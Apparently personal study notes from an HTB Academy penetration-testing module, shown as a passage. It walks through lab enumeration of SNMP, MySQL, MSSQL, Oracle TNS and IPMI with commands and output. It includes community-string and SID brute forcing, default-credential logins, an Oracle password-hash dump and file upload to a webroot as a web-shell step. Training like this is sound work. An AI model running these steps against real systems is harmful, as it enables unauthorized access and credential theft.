iso.3.6.1.2.1.1.9.1.3.3 = STRING: "The management information definitions for the SNMP User-based Security Model."
iso.3.6.1.2.1.1.9.1.3.4 = STRING: "The MIB module for SNMPv2 entities"
iso.3.6.1.2.1.1.9.1.3.5 = STRING: "View-based Access Control Model for SNMP."
iso.3.6.1.2.1.1.9.1.3.6 = STRING: "The MIB module for managing TCP implementations"
iso.3.6.1.2.1.1.9.1.3.7 = STRING: "The MIB module for managing IP and ICMP implementations"
iso.3.6.1.2.1.1.9.1.3.8 = STRING: "The MIB module for managing UDP implementations"
iso.3.6.1.2.1.1.9.1.3.9 = STRING: "The MIB modules for managing SNMP Notification, plus filtering."
iso.3.6.1.2.1.1.9.1.3.10 = STRING: "The MIB module for logging SNMP Notifications."
iso.3.6.1.2.1.1.9.1.4.1 = Timeticks: (0) 0:00:00.00
iso.3.6.1.2.1.1.9.1.4.2 = Timeticks: (0) 0:00:00.00
iso.3.6.1.2.1.1.9.1.4.3 = Timeticks: (0) 0:00:00.00
iso.3.6.1.2.1.1.9.1.4.4 = Timeticks: (0) 0:00:00.00
iso.3.6.1.2.1.1.9.1.4.5 = Timeticks: (0) 0:00:00.00
iso.3.6.1.2.1.1.9.1.4.6 = Timeticks: (0) 0:00:00.00
iso.3.6.1.2.1.1.9.1.4.7 = Timeticks: (0) 0:00:00.00
iso.3.6.1.2.1.1.9.1.4.8 = Timeticks: (0) 0:00:00.00
iso.3.6.1.2.1.1.9.1.4.9 = Timeticks: (0) 0:00:00.00
iso.3.6.1.2.1.1.9.1.4.10 = Timeticks: (0) 0:00:00.00
iso.3.6.1.2.1.25.1.1.0 = Timeticks: (3676678) 10:12:46.78
iso.3.6.1.2.1.25.1.2.0 = Hex-STRING: 07 E5 09 14 0E 2B 2D 00 2B 02 00 
iso.3.6.1.2.1.25.1.3.0 = INTEGER: 393216
iso.3.6.1.2.1.25.1.4.0 = STRING: "BOOT_IMAGE=/boot/vmlinuz-5.11.0-34-generic root=UUID=9a6a5c52-f92a-42ea-8ddf-940d7e0f4223 ro quiet splash"
iso.3.6.1.2.1.25.1.5.0 = Gauge32: 3
iso.3.6.1.2.1.25.1.6.0 = Gauge32: 411
iso.3.6.1.2.1.25.1.7.0 = INTEGER: 0
iso.3.6.1.2.1.25.1.7.0 = No more variables left in this MIB View (It is past the end of the MIB tree)

...SNIP...

iso.3.6.1.2.1.25.6.3.1.2.1232 = STRING: "printer-driver-sag-gdi_0.1-7_all"
iso.3.6.1.2.1.25.6.3.1.2.1233 = STRING: "printer-driver-splix_2.0.0+svn315-7fakesync1build1_amd64"
iso.3.6.1.2.1.25.6.3.1.2.1234 = STRING: "procps_2:3.3.16-1ubuntu2.3_amd64"
iso.3.6.1.2.1.25.6.3.1.2.1235 = STRING: "proftpd-basic_1.3.6c-2_amd64"
iso.3.6.1.2.1.25.6.3.1.2.1236 = STRING: "proftpd-doc_1.3.6c-2_all"
iso.3.6.1.2.1.25.6.3.1.2.1237 = STRING: "psmisc_23.3-1_amd64"
iso.3.6.1.2.1.25.6.3.1.2.1238 = STRING: "publicsuffix_20200303.0012-1_all"
iso.3.6.1.2.1.25.6.3.1.2.1239 = STRING: "pulseaudio_1:13.99.1-1ubuntu3.12_amd64"
iso.3.6.1.2.1.25.6.3.1.2.1240 = STRING: "pulseaudio-module-bluetooth_1:13.99.1-1ubuntu3.12_amd64"
iso.3.6.1.2.1.25.6.3.1.2.1241 = STRING: "pulseaudio-utils_1:13.99.1-1ubuntu3.12_amd64"
iso.3.6.1.2.1.25.6.3.1.2.1242 = STRING: "python-apt-common_2.0.0ubuntu0.20.04.6_all"
iso.3.6.1.2.1.25.6.3.1.2.1243 = STRING: "python3_3.8.2-0ubuntu2_amd64"
iso.3.6.1.2.1.25.6.3.1.2.1244 = STRING: "python3-acme_1.1.0-1_all"
iso.3.6.1.2.1.25.6.3.1.2.1245 = STRING: "python3-apport_2.20.11-0ubuntu27.21_all"
iso.3.6.1.2.1.25.6.3.1.2.1246 = STRING: "python3-apt_2.0.0ubuntu0.20.04.6_amd64" 

...SNIP...
```

### Onesixtyone
- `onesixtyone` can be used to brute-force the names of the community strings since they can be named arbitrarily by the admin.
- If we do not know the community string, we can use `onesixtyone` and `SecLists` wordlists to identify these community strings.

```bash
# Managed to find public as the community string.
selwynang@htb[/htb]$ sudo apt install onesixtyone
selwynang@htb[/htb]$ onesixtyone -c /opt/useful/seclists/Discovery/SNMP/snmp.txt 10.129.14.128

Scanning 1 hosts, 3220 communities
10.129.14.128 [public] Linux htb 5.11.0-37-generic #41~20.04.2-Ubuntu SMP Fri Sep 24 09:06:38 UTC 2021 x86_64
```

### Braa
- Once we know a community string, we can use it with `braa` to brute-force the individual OIDs and enumerate the information behind them.

```bash
selwynang@htb[/htb]$ sudo apt install braa
selwynang@htb[/htb]$ braa <community string>@<IP>:.1.3.6.*   # Syntax
selwynang@htb[/htb]$ braa public@10.129.14.128:.1.3.6.*

10.129.14.128:20ms:.1.3.6.1.2.1.1.1.0:Linux htb 5.11.0-34-generic #36~20.04.1-Ubuntu SMP Fri Aug 27 08:06:32 UTC 2021 x86_64
10.129.14.128:20ms:.1.3.6.1.2.1.1.2.0:.1.3.6.1.4.1.8072.3.2.10
10.129.14.128:20ms:.1.3.6.1.2.1.1.3.0:548
10.129.14.128:20ms:.1.3.6.1.2.1.1.4.0:mrb3n@inlanefreight.htb
10.129.14.128:20ms:.1.3.6.1.2.1.1.5.0:htb
10.129.14.128:20ms:.1.3.6.1.2.1.1.6.0:US
10.129.14.128:20ms:.1.3.6.1.2.1.1.7.0:78
...SNIP...
```

# C.8. Host Based Enumeration: MySQL
- `mysql` is an open-source SQL relational database management system developed and supported by Oracle.
- `mysql` works according to the client-server principle and consists of a MySQL server and one or more MySQL clients. The MySQL server is the actual database management system.
- `MariaDB`, which is often connected with MySQL, is a fork of the original MySQL code. This is because the chief developer of MySQL left the company MySQL AB after it was acquired by Oracle and developed another open-source SQL database management system based on the source code of MySQL and called it MariaDB.

## MySQL Clients
- Can retrieve and edit the data using structured queries to the database engine.
- Inserting, deleting, modifying, and retrieving data, is done using the SQL database language.

## MySQL Databases
- Sensitive data such as passwords can be stored in their plain-text form by `mysql`. However, they are generally encrypted beforehand using secure methods such as one-way encryption.

## Default Configurations
```bash
selwynang@htb[/htb]$ sudo apt install mysql-server -y
selwynang@htb[/htb]$ cat /etc/mysql/mysql.conf.d/mysqld.cnf | grep -v "#" | sed -r '/^\s*$/d'

[client]
port        = 3306
socket      = /var/run/mysqld/mysqld.sock

[mysqld_safe]
pid-file    = /var/run/mysqld/mysqld.pid
socket      = /var/run/mysqld/mysqld.sock
nice        = 0

[mysqld]
skip-host-cache
skip-name-resolve
user        = mysql
pid-file    = /var/run/mysqld/mysqld.pid
socket      = /var/run/mysqld/mysqld.sock
port        = 3306
basedir     = /usr
datadir     = /var/lib/mysql
tmpdir      = /tmp
lc-messages-dir = /usr/share/mysql
explicit_defaults_for_timestamp

symbolic-links=0

!includedir /etc/mysql/conf.d/
```

## Dangerous Settings
| Settings | Description |
|---|---|
| `user` | Sets which user the MySQL service will run as. |
| `password` | Sets the password for the MySQL user. |
| `admin_address` | The IP address on which to listen for TCP/IP connections on the administrative network interface. |
| `debug` | This variable indicates the current debugging settings. |
| `sql_warnings` | This variable controls whether single-row INSERT statements produce an information string if warnings occur. |
| `secure_file_priv` | This variable is used to limit the effect of data import and export operations. |

- `user`, `password`, and `admin_address` are security-relevant because the entries are made in plain text. Often, the rights for the configuration file of the MySQL server are not assigned correctly. If we get another way to read files or even a shell, we can see the file and the username and password for the MySQL server.
- `debug` and `sql_warnings` settings provide verbose information output in case of errors, which are essential for the administrator but should not be seen by others. This information often contains sensitive content, which could be detected by trial and error to identify further attack possibilities.

## Footprinting the Service

### Nmap
- `mysql` server runs on TCP port `3306`.

```bash
selwynang@htb[/htb]$ sudo nmap 10.129.14.128 -sV -sC -p3306 --script mysql*

Starting Nmap 7.80 ( https://nmap.org ) at 2021-09-21 00:53 CEST
Nmap scan report for 10.129.14.128
Host is up (0.00021s latency).

PORT     STATE SERVICE     VERSION
3306/tcp open  nagios-nsca Nagios NSCA
| mysql-brute: 
|   Accounts: 
|     root:<empty> - Valid credentials
|_  Statistics: Performed 45010 guesses in 5 seconds, average tps: 9002.0
|_mysql-databases: ERROR: Script execution failed (use -d to debug)
|_mysql-dump-hashes: ERROR: Script execution failed (use -d to debug)
| mysql-empty-password: 
|_  root account has empty password
| mysql-enum: 
|   Valid usernames: 
|     root:<empty> - Valid credentials
|     netadmin:<empty> - Valid credentials
|     guest:<empty> - Valid credentials
|     user:<empty> - Valid credentials
|     web:<empty> - Valid credentials
|     sysadmin:<empty> - Valid credentials
|     administrator:<empty> - Valid credentials
|     webadmin:<empty> - Valid credentials
|     admin:<empty> - Valid credentials
|     test:<empty> - Valid credentials
|_  Statistics: Performed 10 guesses in 1 seconds, average tps: 10.0
| mysql-info: 
|   Protocol: 10
|   Version: 8.0.26-0ubuntu0.20.04.1
|   Thread ID: 13
|   Capabilities flags: 65535
|   Some Capabilities: SupportsLoadDataLocal, SupportsTransactions, Speaks41ProtocolOld, LongPassword, DontAllowDatabaseTableColumn, Support41Auth, IgnoreSigpipes, SwitchToSSLAfterHandshake, FoundRows, InteractiveClient, Speaks41ProtocolNew, ConnectWithDatabase, IgnoreSpaceBeforeParenthesis, LongColumnFlag, SupportsCompression, ODBCClient, SupportsMultipleStatments, SupportsAuthPlugins, SupportsMultipleResults
|   Status: Autocommit
|   Salt: YTSgMfqvx\x0F\x7F\x16\&\x1EAeK>0
|_  Auth Plugin Name: caching_sha2_password
|_mysql-users: ERROR: Script execution failed (use -d to debug)
|_mysql-variables: ERROR: Script execution failed (use -d to debug)
|_mysql-vuln-cve2012-2122: ERROR: Script execution failed (use -d to debug)
MAC Address: 00:00:00:00:00:00 (VMware)

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 11.21 seconds
```

### Interaction with MySQL Server
- Most important databases for MySQL server are:
    - `system schema (sys)`: Contains tables, information, and metadata necessary for management.
    - `information schema (information_schema)`: A database containing metadata, which is mainly retrieved from the system schema database.
```bash
selwynang@htb[/htb]$ mysql -u root -pP4SSw0rd -h 10.129.14.128

Welcome to the MariaDB monitor.  Commands end with ; or \g.
Your MySQL connection id is 150165
Server version: 8.0.27-0ubuntu0.20.04.1 (Ubuntu)                                                         
Copyright (c) 2000, 2018, Oracle, MariaDB Corporation Ab and others.                                     
Type 'help;' or '\h' for help. Type '\c' to clear the current input statement.                           
      
MySQL [(none)]> show databases;                                                                          
+--------------------+
| Database           |
+--------------------+
| information_schema |
| mysql              |
| performance_schema |
| sys                |
+--------------------+
4 rows in set (0.006 sec)


MySQL [(none)]> select version();
+-------------------------+
| version()               |
+-------------------------+
| 8.0.27-0ubuntu0.20.04.1 |
+-------------------------+
1 row in set (0.001 sec)


MySQL [(none)]> use mysql;
MySQL [mysql]> show tables;
+------------------------------------------------------+
| Tables_in_mysql                                      |
+------------------------------------------------------+
| columns_priv                                         |
| component                                            |
| db                                                   |
| default_roles                                        |
| engine_cost                                          |
| func                                                 |
| general_log                                          |
| global_grants                                        |
| gtid_executed                                        |
| help_category                                        |
| help_keyword                                         |
| help_relation                                        |
| help_topic                                           |
| innodb_index_stats                                   |
| innodb_table_stats                                   |
| password_history                                     |
...SNIP...
| user                                                 |
+------------------------------------------------------+
37 rows in set (0.002 sec)
```

```bash
mysql> use sys;
mysql> show tables;  

+-----------------------------------------------+
| Tables_in_sys                                 |
+-----------------------------------------------+
| host_summary                                  |
| host_summary_by_file_io                       |
| host_summary_by_file_io_type                  |
| host_summary_by_stages                        |
| host_summary_by_statement_latency             |
| host_summary_by_statement_type                |
| innodb_buffer_stats_by_schema                 |
| innodb_buffer_stats_by_table                  |
| innodb_lock_waits                             |
| io_by_thread_by_latency                       |
...SNIP...
| x$waits_global_by_latency                     |
+-----------------------------------------------+


mysql> select host, unique_users from host_summary;

+-------------+--------------+                   
| host        | unique_users |                   
+-------------+--------------+                   
| 10.129.14.1 |            1 |                   
| localhost   |            2 |                   
+-------------+--------------+                   
2 rows in set (0,01 sec)  
```

### MySQL Commands to remember
| Command | Description |
|---|---|
| `mysql -u <user> -p<password> -h <IP address>` | Connect to the MySQL server. There should **not** be a space between the '-p' flag, and the password. |
| `show databases;` | Show all databases. |
| `use <database>;` | Select one of the existing databases. |
| `show tables;` | Show all available tables in the selected database. |
| `show columns from <table>;` | Show all columns in the selected table. |
| `select * from <table>;` | Show everything in the desired table. |
| `select * from <table> where <column> = "<string>";` | Search for needed string in the desired table. |

# C.9. Host Based Enumeration: MSSQL
- `Microsoft SQL (MSSQL)` is Microsoft's SQL-based relational database management system. 
- Unlike MySQL, which we discussed in the last section, MSSQL is closed source and was initially written to run on Windows operating systems. 
- It is popular among database administrators and developers when building applications that run on Microsoft's .NET framework due to its strong native support for .NET.
- MSSQL has default system databases that can help us understand the structure of all the databases that may be hosted on a target server.

| Default System Database | Description |
|---|---|
| `master` | Tracks all system information for an SQL server instance. |
| `model` | Template database that acts as a structure for every new database created. Any setting changed in the model database will be reflected in any new database created after changes to the model database. |
| `msdb` | The SQL Server Agent uses this database to schedule jobs & alerts. |
| `tempdb` | Stores temporary objects. |
| `resource` | Read-only database containing system objects included with SQL server. |

## Default Configuration
- When an admin initially installs and configures MSSQL to be network accessible, the SQL service will likely run as `NT SERVICE\MSSQLSERVER`.
- Connecting from the client-side is possible through Windows Authentication, and by default, encryption is not enforced when attempting to connect.
- Authentication being set to Windows Authentication means that the underlying Windows OS will process the login request and use either the local SAM database or the domain controller (hosting Active Directory) before allowing connectivity to the database management system. 
- Using Active Directory can be ideal for auditing activity and controlling access in a Windows environment, but if an account is compromised, it could lead to privilege escalation and lateral movement across a Windows domain environment.

## Dangerous Settings
1. MSSQL clients not using encryption to connect to the MSSQL server.
2. The use of self-signed certificates when encryption is being used. 
3. It is possible to spoof self-signed certificates.
4. The use of named pipes. 
5. Weak & default `sa` credentials. Admins may forget to disable this account.

## Footprinting the Service

### Nmap
- MSSQL listens on TCP port `1433`.
- With Nmap's MSSQL scripts, we can see the hostname, database instance name, software version of MSSQL, named pipes.

```bash
selwynang@htb[/htb]$ sudo nmap --script ms-sql-info,ms-sql-empty-password,ms-sql-xp-cmdshell,ms-sql-config,ms-sql-ntlm-info,ms-sql-tables,ms-sql-hasdbaccess,ms-sql-dac,ms-sql-dump-hashes --script-args mssql.instance-port=1433,mssql.username=sa,mssql.password=,mssql.instance-name=MSSQLSERVER -sV -p 1433 10.129.201.248

Starting Nmap 7.91 ( https://nmap.org ) at 2021-11-08 09:40 EST
Nmap scan report for 10.129.201.248
Host is up (0.15s latency).

PORT     STATE SERVICE  VERSION
1433/tcp open  ms-sql-s Microsoft SQL Server 2019 15.00.2000.00; RTM
| ms-sql-ntlm-info: 
|   Target_Name: SQL-01
|   NetBIOS_Domain_Name: SQL-01
|   NetBIOS_Computer_Name: SQL-01
|   DNS_Domain_Name: SQL-01
|   DNS_Computer_Name: SQL-01
|_  Product_Version: 10.0.17763

Host script results:
| ms-sql-dac: 
|_  Instance: MSSQLSERVER; DAC port: 1434 (connection failed)
| ms-sql-info: 
|   Windows server name: SQL-01
|   10.129.201.248\MSSQLSERVER: 
|     Instance name: MSSQLSERVER
|     Version: 
|       name: Microsoft SQL Server 2019 RTM
|       number: 15.00.2000.00
|       Product: Microsoft SQL Server 2019
|       Service pack level: RTM
|       Post-SP patches applied: false
|     TCP port: 1433
|     Named pipe: \\10.129.201.248\pipe\sql\query
|_    Clustered: false

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 8.52 seconds
```

### MSSQL Ping in Metasploit
- We can also use Metasploit to run an auxiliary scanner called `mssql_ping` that will scan the MSSQL service and provide helpful information in our footprinting process.

```bash
msf6 auxiliary(scanner/mssql/mssql_ping) > set rhosts 10.129.201.248

rhosts => 10.129.201.248


msf6 auxiliary(scanner/mssql/mssql_ping) > run

[*] 10.129.201.248:       - SQL Server information for 10.129.201.248:
[+] 10.129.201.248:       -    ServerName      = SQL-01
[+] 10.129.201.248:       -    InstanceName    = MSSQLSERVER
[+] 10.129.201.248:       -    IsClustered     = No
[+] 10.129.201.248:       -    Version         = 15.0.2000.5
[+] 10.129.201.248:       -    tcp             = 1433
[+] 10.129.201.248:       -    np              = \\SQL-01\pipe\sql\query
[*] 10.129.201.248:       - Scanned 1 of 1 hosts (100% complete)
[*] Auxiliary module execution completed
```

### Connecting with Mssqlclient.py
- If we can guess or gain access to credentials, this allows us to remotely connect to the MSSQL server and start interacting with databases using T-SQL (Transact-SQL). 
- Authenticating with MSSQL will enable us to interact directly with databases through the SQL Database Engine. 
- From Pwnbox or a personal attack host, we can use Impacket's `mssqlclient.py` to connect as seen in the output below. Once connected to the server, it may be good to get a lay of the land and list the databases present on the system.

```bash
selwynang@htb[/htb]$ python3 mssqlclient.py Administrator@10.129.201.248 -windows-auth

# Or use impacket-mssqlclient instead of python3 mssqlclient.py to make use of HTB's global path.

Impacket v0.9.22 - Copyright 2020 SecureAuth Corporation

Password:
[*] Encryption required, switching to TLS
[*] ENVCHANGE(DATABASE): Old Value: master, New Value: master
[*] ENVCHANGE(LANGUAGE): Old Value: , New Value: us_english
[*] ENVCHANGE(PACKETSIZE): Old Value: 4096, New Value: 16192
[*] INFO(SQL-01): Line 1: Changed database context to 'master'.
[*] INFO(SQL-01): Line 1: Changed language setting to us_english.
[*] ACK: Result: 1 - Microsoft SQL Server (150 7208) 
[!] Press help for extra shell commands

SQL> select name from sys.databases

name                                                                                                                               

--------------------------------------------------------------------------------------

master                                                                                                                             

tempdb                                                                                                                             

model                                                                                                                              

msdb                                                                                                                               

Transactions    
```

# C.10. Host Based Enumeration: Oracle TNS
- `Oracle Transparent Network Substrate (TNS)` server is a communication protocol that facilitates communication between Oracle databases and applications over networks.

## Default Configuration
- By default, the listener listens for incoming connections on the TCP `1521` port. However, this default port can be changed during installation or later in the configuration file.
- The TNS listener is configured to support various network protocols, including TCP/IP, UDP, IPX/SPX, and AppleTalk. The listener can also support multiple network interfaces and listen on specific IP addresses or all available network interfaces.
- The configuration files for Oracle TNS are called `tnsnames.ora` and `listener.ora` and are typically located in the `$ORACLE_HOME/network/admin` directory.
    - The client-side Oracle Net Services software uses the `tnsnames.ora` file to resolve service names to network addresses.
    - The listener process uses the `listener.ora` file to determine the services it should listen to and the behavior of the listener.


- Oracle TNS is often used with other Oracle services like Oracle DBSNMP, Oracle Databases, Oracle Application Server, Oracle Enterprise Manager, Oracle Fusion Middleware, web servers, and many more.
    - Oracle 9 has a default password, `CHANGE_ON_INSTALL`. 
    - Oracle 10 has no default password set.
    - Oracle DBSNMP service also uses a default password, `dbsnmp`.
    - Many organizations still use the `finger` service together with Oracle, which can put Oracle's service at risk and make it vulnerable when we have the required knowledge of a home directory.

### Tnsnames.ora
- Each database or service has a unique entry in the `tnsnames.ora` file, containing the necessary information for clients to connect to the service. 
- The entry consists of a name for the service, the network location of the service, and the database or service name that clients should use when connecting to the service.

```bash
ORCL =
  (DESCRIPTION =
    (ADDRESS_LIST =
      (ADDRESS = (PROTOCOL = TCP)(HOST = 10.129.11.102)(PORT = 1521))
    )
    (CONNECT_DATA =
      (SERVER = DEDICATED)
      (SERVICE_NAME = orcl)
    )
  )

# Service called ORCL, which is listening on port TCP/1521 on the IP address 10.129.11.102. 
# Clients should use the service name orcl when connecting to the service.
```

### Listener.ora
- `listener.ora` file is a server-side configuration file that defines the listener process's properties and parameters, which is responsible for receiving incoming client requests and forwarding them to the appropriate Oracle database instance.

```bash
SID_LIST_LISTENER =
  (SID_LIST =
    (SID_DESC =
      (SID_NAME = PDB1)
      (ORACLE_HOME = C:\oracle\product\19.0.0\dbhome_1)
      (GLOBAL_DBNAME = PDB1)
      (SID_DIRECTORY_LIST =
        (SID_DIRECTORY =
          (DIRECTORY_TYPE = TNS_ADMIN)
          (DIRECTORY = C:\oracle\product\19.0.0\dbhome_1\network\admin)
        )
      )
    )
  )

LISTENER =
  (DESCRIPTION_LIST =
    (DESCRIPTION =
      (ADDRESS = (PROTOCOL = TCP)(HOST = orcl.inlanefreight.htb)(PORT = 1521))
      (ADDRESS = (PROTOCOL = IPC)(KEY = EXTPROC1521))
    )
  )

ADR_BASE_LISTENER = C:\oracle
```

### SID
- In Oracle RDBMS, a `System Identifier (SID)` is a unique name that identifies a particular database instance.
- An instance is a set of processes and memory structures that interact to manage the database's data. When a client connects to an Oracle database, it specifies the database's SID along with its connection string. 
- The client uses this SID to identify which database instance it wants to connect to. Suppose the client does not specify a SID. Then, the default value defined in the `tnsnames.ora` file is used.
- There are various ways to enumerate, or better said, guess SIDs. Therefore we can use tools like `nmap`, `hydra`, `odat`, and others.

## Footprinting the Service

### ODAT
- `Oracle Database Attacking Tool (ODAT)` is an open-source penetration testing tool written in Python and designed to enumerate and exploit vulnerabilities in Oracle databases. 
- It can be used to identify and exploit various security flaws in Oracle databases, including SQL injection, remote code execution, and privilege escalation.

```bash
selwynang@htb[/htb]$ ./odat.py -h

usage: odat.py [-h] [--version]
               {all,tnscmd,tnspoison,sidguesser,snguesser,passwordguesser,utlhttp,httpuritype,utltcp,ctxsys,externaltable,dbmsxslprocessor,dbmsadvisor,utlfile,dbmsscheduler,java,passwordstealer,oradbg,dbmslob,stealremotepwds,userlikepwd,smb,privesc,cve,search,unwrapper,clean}
               ...

            _  __   _  ___ 
           / \|  \ / \|_ _|
          ( o ) o ) o || | 
           \_/|__/|_n_||_| 
-------------------------------------------
  _        __           _           ___ 
 / \      |  \         / \         |_ _|
( o )       o )         o |         | | 
 \_/racle |__/atabase |_n_|ttacking |_|ool 
-------------------------------------------

By Quentin Hardy (quentin.hardy@protonmail.com or quentin.hardy@bt.com)
<SNIP>
```
- We can use the `odat.py` tool to perform a variety of scans to enumerate and gather information about the Oracle database services and its components. Those scans can retrieve database names, versions, running processes, user accounts, vulnerabilities, misconfigurations, etc. 
- `all` option allows us try all modules of the odat.py tool.

```bash
selwynang@htb[/htb]$ ./odat.py all -s 10.129.204.235

[+] Checking if target 10.129.204.235:1521 is well configured for a connection...
[+] According to a test, the TNS listener 10.129.204.235:1521 is well configured. Continue...

<SNIP>

[!] Notice: 'mdsys' account is locked, so skipping this username for password           #####################| ETA:  00:01:16 
[!] Notice: 'oracle_ocm' account is locked, so skipping this username for password       #####################| ETA:  00:01:05 
[!] Notice: 'outln' account is locked, so skipping this username for password           #####################| ETA:  00:00:59
[+] Valid credentials found: scott/tiger. Continue...

<SNIP>
```

### Nmap
```bash
selwynang@htb[/htb]$ sudo nmap -p1521 -sV 10.129.204.235 --open

Starting Nmap 7.93 ( https://nmap.org ) at 2023-03-06 10:59 EST
Nmap scan report for 10.129.204.235
Host is up (0.0041s latency).

PORT     STATE SERVICE    VERSION
1521/tcp open  oracle-tns Oracle TNS listener 11.2.0.2.0 (unauthorized)

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 6.64 seconds
```

### Nmap - SID Bruteforcing
```bash
selwynang@htb[/htb]$ sudo nmap -p1521 -sV 10.129.204.235 --open --script oracle-sid-brute

Starting Nmap 7.93 ( https://nmap.org ) at 2023-03-06 11:01 EST
Nmap scan report for 10.129.204.235
Host is up (0.0044s latency).

PORT     STATE SERVICE    VERSION
1521/tcp open  oracle-tns Oracle TNS listener 11.2.0.2.0 (unauthorized)
| oracle-sid-brute: 
|_  XE

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 55.40 seconds
```
### SQLPlus 
- Once we have found valid credentials, we can use `sqlplus` to connect to the Oracle database and interact with it.
- **Login**
```bash
selwynang@htb[/htb]$ sqlplus scott/tiger@10.129.204.235/XE

SQL*Plus: Release 19.0.0.0.0 - Production
Version 19.6.0.0.0

Copyright (c) 1982, 2021, Oracle. All rights reserved.

ERROR:
ORA-28002: the password will expire within 7 days



Connected to:
Oracle Database 11g Express Edition Release 11.2.0.2.0 - 64bit Production

SQL> 
```
- **Oracle RDBMS Interaction**
```bash
SQL> select table_name from all_tables;

TABLE_NAME
------------------------------
DUAL
SYSTEM_PRIVILEGE_MAP
TABLE_PRIVILEGE_MAP
STMT_AUDIT_OPTION_MAP
AUDIT_ACTIONS
WRR$_REPLAY_CALL_FILTER
HS_BULKLOAD_VIEW_OBJ
HS$_PARALLEL_METADATA
HS_PARTITION_COL_NAME
HS_PARTITION_COL_TYPE
HELP

<SNIP>


SQL> select * from user_role_privs;

USERNAME                       GRANTED_ROLE                   ADM DEF OS_
------------------------------ ------------------------------ --- --- ---
SCOTT                          CONNECT                        NO  YES NO
SCOTT                          RESOURCE                       NO  YES NO

#  The user scott has no administrative privileges. However, we can try using this account to log in as the System Database Admin (sysdba), giving us higher privileges. This is possible when the user scott has the appropriate privileges typically granted by the database administrator or used by the administrator him/herself.
```

- **Oracle RDBMS - Database Enumeration**
```bash
selwynang@htb[/htb]$ sqlplus scott/tiger@10.129.204.235/XE as sysdba

SQL*Plus: Release 21.0.0.0.0 - Production on Mon Mar 6 11:32:58 2023
Version 21.4.0.0.0

Copyright (c) 1982, 2021, Oracle. All rights reserved.


Connected to:
Oracle Database 11g Express Edition Release 11.2.0.2.0 - 64bit Production


SQL> select * from user_role_privs;

USERNAME                       GRANTED_ROLE                   ADM DEF OS_
------------------------------ ------------------------------ --- --- ---
SYS                            ADM_PARALLEL_EXECUTE_TASK      YES YES NO
SYS                            APEX_ADMINISTRATOR_ROLE        YES YES NO
SYS                            AQ_ADMINISTRATOR_ROLE          YES YES NO
SYS                            AQ_USER_ROLE                   YES YES NO
SYS                            AUTHENTICATEDUSER              YES YES NO
SYS                            CONNECT                        YES YES NO
SYS                            CTXAPP                         YES YES NO
SYS                            DATAPUMP_EXP_FULL_DATABASE     YES YES NO
SYS                            DATAPUMP_IMP_FULL_DATABASE     YES YES NO
SYS                            DBA                            YES YES NO
SYS                            DBFS_ROLE                      YES YES NO

USERNAME                       GRANTED_ROLE                   ADM DEF OS_
------------------------------ ------------------------------ --- --- ---
SYS                            DELETE_CATALOG_ROLE            YES YES NO
SYS                            EXECUTE_CATALOG_ROLE           YES YES NO
<SNIP>
```

- **Oracle RDBMS - Extract Password Hashes**
```bash
SQL> select name, password from sys.user$;

NAME                           PASSWORD
------------------------------ ------------------------------
SYS                            FBA343E7D6C8BC9D
PUBLIC
CONNECT
RESOURCE
DBA
SYSTEM                         B5073FE1DE351687
SELECT_CATALOG_ROLE
EXECUTE_CATALOG_ROLE
DELETE_CATALOG_ROLE
OUTLN                          4A3BA55E08595C81
EXP_FULL_DATABASE

NAME                           PASSWORD
------------------------------ ------------------------------
IMP_FULL_DATABASE
LOGSTDBY_ADMINISTRATOR
<SNIP>
```

- **Oracle RDBMS - File Upload**
    - Another option is to upload a web shell to the target. However, this requires the server to run a web server, and we need to know the exact location of the root directory for the webserver.
    - Default paths are:
        - Linux: `/var/www/html`
        - Windows: `C:\inetpub\wwwroot`

```bash
selwynang@htb[/htb]$ echo "Oracle File Upload Test" > testing.txt
selwynang@htb[/htb]$ ./odat.py utlfile -s 10.129.204.235 -d XE -U scott -P tiger --sysdba --putFile C:\\inetpub\\wwwroot testing.txt ./testing.txt

[1] (10.129.204.235:1521): Put the ./testing.txt local file in the C:\inetpub\wwwroot folder like testing.txt on the 10.129.204.235 server                                                                                                  
[+] The ./testing.txt file was created on the C:\inetpub\wwwroot directory on the 10.129.204.235 server like the testing.txt file
```

# C.11. Host Based Enumeration: IPMI
- `Intelligent Platform Management Interface (IPMI)` is a set of standardized specifications for hardware-based host management systems used for system management and monitoring. It acts as an autonomous subsystem and works independently of the host's BIOS, CPU, firmware, and underlying operating system.
- IPMI provides sysadmins with the ability to manage and monitor systems even if they are powered off or in an unresponsive state. It operates using a direct network connection to the system's hardware and does not require access to the operating system via a login shell. 
- IPMI can also be used for remote upgrades to systems without requiring physical access to the target host.
- IPMI can monitor a range of different things such as system temperature, voltage, fan status, and power supplies. It can also be used for querying inventory information, reviewing hardware logs, and alerting using SNMP. 

## Footprinting the Service
- IPMI communicates over port `623` UDP.
- Systems that use the IPMI protocol are called Baseboard Management Controllers (BMCs). BMCs are typically implemented as embedded ARM systems running Linux, and connected directly to the host's motherboard.

### Nmap
```bash
selwynang@htb[/htb]$ sudo nmap -sU --script ipmi-version -p 623 ilo.inlanfreight.local

Starting Nmap 7.92 ( https://nmap.org ) at 2021-11-04 21:48 GMT
Nmap scan report for ilo.inlanfreight.local (172.16.2.2)
Host is up (0.00064s latency).

PORT    STATE SERVICE
623/udp open  asf-rmcp
| ipmi-version:
|   Version:
|     IPMI-2.0
|   UserAuth:
|   PassAuth: auth_user, non_null_user
|_  Level: 2.0
MAC Address: 14:03:DC:674:18:6A (Hewlett Packard Enterprise)

Nmap done: 1 IP address (1 host up) scanned in 0.46 seconds
```

### Metasploit Version Scan
```bash
msf6 > use auxiliary/scanner/ipmi/ipmi_version 
msf6 auxiliary(scanner/ipmi/ipmi_version) > set rhosts 10.129.42.195
msf6 auxiliary(scanner/ipmi/ipmi_version) > show options 

Module options (auxiliary/scanner/ipmi/ipmi_version):

   Name       Current Setting  Required  Description
   ----       ---------------  --------  -----------
   BATCHSIZE  256              yes       The number of hosts to probe in each set
   RHOSTS     10.129.42.195    yes       The target host(s), range CIDR identifier, or hosts file with syntax 'file:<path>'
   RPORT      623              yes       The target port (UDP)
   THREADS    10               yes       The number of concurrent threads


msf6 auxiliary(scanner/ipmi/ipmi_version) > run

[*] Sending IPMI requests to 10.129.42.195->10.129.42.195 (1 hosts)
